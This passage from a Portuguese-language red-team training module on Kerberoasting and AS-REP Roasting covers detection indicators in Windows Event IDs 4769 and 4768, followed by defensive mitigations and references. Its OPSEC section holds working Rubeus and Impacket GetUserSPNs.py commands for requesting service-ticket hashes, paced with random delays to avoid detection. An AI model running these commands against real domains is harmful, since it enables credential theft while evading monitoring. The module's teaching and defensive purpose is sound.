Ticket Encryption Type: 0x17 (RC4-HMAC — suspeito!)
Ticket Options: 0x40810000
Failure Code: 0x0 (sucesso)
Client Address: 192.168.1.50
```

Indicadores de suspeita no 4769:
- `Encryption Type: 0x17` (RC4) para serviços que deveriam usar AES — indica possível downgrade attack
- Múltiplos 4769 de um único usuário para diferentes SPNs em curto intervalo
- Solicitações de contas de serviço raramente acessadas
- IP fora do padrão normal de acesso

**AS-REP Roasting — Event ID 4768 (AS-REQ)**:
```
Log: Security
Event ID: 4768
Account Name: usuario_vulneravel
Pre-Authentication Type: 0 (sem pré-autenticação — indica DONT_REQUIRE_PREAUTH)
Failure Code: 0x0
Client Address: 192.168.1.50
```

Pre-Authentication Type = 0 em um evento 4768 bem-sucedido é o sinal claro de AS-REP Roasting.

### OPSEC — Como Reduzir Ruído

```powershell
# Kerberoasting furtivo — atacar apenas 1-2 contas de alto valor
# ao invés de solicitar TGS de todos os SPNs de uma vez
Rubeus.exe kerberoast /user:svc_sql_admin /nowrap /outfile:single.txt

# Espaçar requests — adicionar delay entre requests
# (Rubeus não tem delay nativo — considerar script customizado)

# Usar credenciais já comprometidas de um usuário "legítimo"
# que normalmente acessaria aquele serviço

# Preferir contas com RC4 que raramente são monitoradas
# ao invés de forçar downgrade (que gera 0x17 mais óbvio)
```

```bash
# Linux — espaçar requests Impacket
for user in svc_sql svc_backup svc_exchange; do
    GetUserSPNs.py domain.com/lowpriv:pass -dc-ip DC_IP \
        -request-user $user \
        -outputfile "hash_${user}.txt"
    sleep $((RANDOM % 30 + 10))  # delay aleatório 10-40 segundos
done
```

### Mitigações (perspectiva defensiva)

1. **Habilitar pré-autenticação Kerberos** em todas as contas — elimina AS-REP Roasting
2. **Usar senhas longas para service accounts** (>25 caracteres, aleatórias) — impede crack de Kerberoasting
3. **Usar Group Managed Service Accounts (gMSA)** — AD gerencia senhas de 120 chars automaticamente
4. **Monitorar Event 4769 com etype 0x17** para service accounts que deveriam usar AES
5. **Implementar Microsoft ATA/Defender for Identity** — detecta automaticamente padrões de Kerberoasting
6. **Auditoria periódica de contas com SPNs** — remover SPNs desnecessários
7. **Configurar "Fine-Grained Password Policy"** para service accounts — forçar senhas complexas longas

---

## Módulos Relacionados

`01_kerberos_fundamentos.md` cobre o protocolo Kerberos em detalhes — AS-REQ/AS-REP/TGS-REQ/TGS-REP, base pra entender o roasting. `03_golden_e_silver_tickets.md` é o próximo passo após quebrar hash do krbtgt via Kerberoasting. `04_dcsync_e_dominancia.md` cobre DCSync quando service account tem replicação. `05_delegacao_unconstrained.md` é relevante porque service accounts com SPN frequentemente têm delegação configurada. `08_bloodhound_e_enumeracao.md` identifica alvos de Kerberoasting e AS-REP Roasting via Cypher queries. MITRE ATT&CK: T1558.003 (Kerberoasting), T1558.004 (AS-REP Roasting).

---

## Leitura Complementar

- Rubeus — https://github.com/GhostPack/Rubeus
- Impacket GetUserSPNs.py — https://github.com/fortra/impacket
- harmj0y — "Roasting AS-REPs" — https://harmj0y.medium.com/roasting-as-reps-e6179a65216b
- harmj0y — "The Art of the Service Account" — https://www.harmj0y.net/blog/redteaming/
- Sean Metcalf — "Kerberoasting Without Mimikatz" — https://adsecurity.org/?p=2907
